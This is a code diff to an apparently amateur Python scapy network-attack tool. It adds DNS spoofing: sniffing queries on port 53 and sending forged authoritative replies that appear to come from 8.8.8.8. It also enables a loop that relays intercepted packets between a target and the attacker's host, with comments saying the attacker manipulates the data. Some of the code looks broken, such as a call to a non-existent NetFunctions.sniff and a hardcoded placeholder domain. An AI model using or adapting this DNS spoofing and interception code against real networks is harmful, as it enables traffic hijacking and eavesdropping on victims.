@@ -213,6 +213,59 @@ class NetFunctions():
         # Send the packet
         scapy.sendp(packet, iface=interface)
 
+    def send_dns_response(client_ip, client_port, domain, ip_address, transaction_id, Interface):
+        # Google’s IP address for the response
+        URL_Destination = "142.250.217.68"  # Replace with any IP you want to use, like Google's
+
+        # Craft the IP layer
+        ip = scapy.IP(src="8.8.8.8", dst=client_ip)  # Adjust source IP if needed
+    
+        # Craft the UDP layer
+        udp = scapy.UDP(sport=53, dport=client_port)
+    
+        # Craft the DNS response layer
+        dns = scapy.DNS(
+            id=transaction_id,
+            qr=1,        # Set to 1 for response
+            opcode=0,
+            aa=1,        # Authoritative answer
+            tc=0,
+            rd=0,
+            ra=0,
+            z=0,
+            rcode=0,
+            qdcount=1,
+            ancount=1,
+            qd=scapy.DNSQR(qname="anydomain.com"),  # Placeholder, ignored in response
+            an=scapy.DNSRR(rrname="anydomain.com", ttl=3600, rdata=URL_Destination)
+        )
+    
+        # Stack layers to form the final packet
+        response_packet = ip / udp / dns
+    
+        # Send the packet
+        scapy.send(response_packet, iface=Interface , verbose = False)
+
+    def dns_request_handler(packet, ip_address, Interface):
+        # Check if packet has DNS layer and is a query
+        if packet.haslayer(scapy.DNS) and packet[scapy.DNS].qr == 0:
+            client_ip = packet[scapy.IP].src
+            client_port = packet[scapy.UDP].sport
+            domain = packet[scapy.DNSQR].qname.decode("utf-8")  # Decode bytes to string
+            transaction_id = packet[scapy.DNS].id
+        
+            # Define the IP address to respond with
+            ip_address = "8.8.8.8"  # Replace with desired IP
+        
+            # Call function to send DNS response
+            # NetFunctions.send_dns_response(client_ip, client_port, domain, ip_address, transaction_id, Interface)
+            NetFunctions.send_dns_response(client_ip, client_port, domain, ip_address, transaction_id, Interface)
+
+    def start_sniffing(ip_address, Interface):
+        NetFunctions.sniff(filter="udp port 53", 
+              prn=lambda packet: NetFunctions.dns_request_handler(packet, ip_address, Interface),
+              iface="eth0")
+
 
 def Main():
     #IP = NetFunctions.get_ip()
@@ -287,24 +340,26 @@ def Main():
 
         while 1:
             try:
-                None
-                # packetCaptured = scapy.sniff(iface=NetFunctions.get_interface_from_ip(IP), count=1) #Captures Packets
+                packetCapturedGroup = scapy.sniff(iface=NetFunctions.get_interface_from_ip(IP), count=5) #Captures Packets
 
-                # if packetCaptured: #Checks packets for IP destination and source so that the attacker can send data to original source after manipulating data
-                #     if (NetFunctions.packet_callback(packetCaptured) == [Mac, Target]): #checks if destination is target
-                #         packet = packetCaptured.copy()
+                for packetCaptured in packetCapturedGroup:
+                    if packetCaptured: #Checks packets for IP destination and source so that the attacker can send data to original source after manipulating data
+                        NetFunctions.start_sniffing("8.8.8.8", Interface)
 
-                #         packet.pdst = Target
-                #         packet.dst = TargetMac
+                        if (NetFunctions.packet_callback(packetCaptured) == [Mac, Target]): #checks if destination is target
+                            packet = packetCaptured.copy()
 
-                #         scapy.send(packet, iface=NetFunctions.get_interface_from_ip(IP) , verbose = False)
-                #     if (NetFunctions.packet_callback(packetCaptured) == [TargetMac, IP]): #checks if destination is host
-                #         packet = packetCaptured.copy()
+                            packet.pdst = Target
+                            packet.dst = TargetMac
 
-                #         packet.pdst = IP
-                #         packet.dst = Mac
+                            scapy.send(packet, iface=NetFunctions.get_interface_from_ip(IP) , verbose = False)
+                        if (NetFunctions.packet_callback(packetCaptured) == [TargetMac, IP]): #checks if destination is host
+                            packet = packetCaptured.copy()
 
-                #         scapy.send(packet, iface=NetFunctions.get_interface_from_ip(IP) , verbose = False) 
+                            packet.pdst = IP
+                            packet.dst = Mac
+
+                            scapy.send(packet, iface=NetFunctions.get_interface_from_ip(IP) , verbose = False) 
 
             except KeyboardInterrupt: #closes on keyboard interupt
                 NetFunctions.restore(Target, IP)
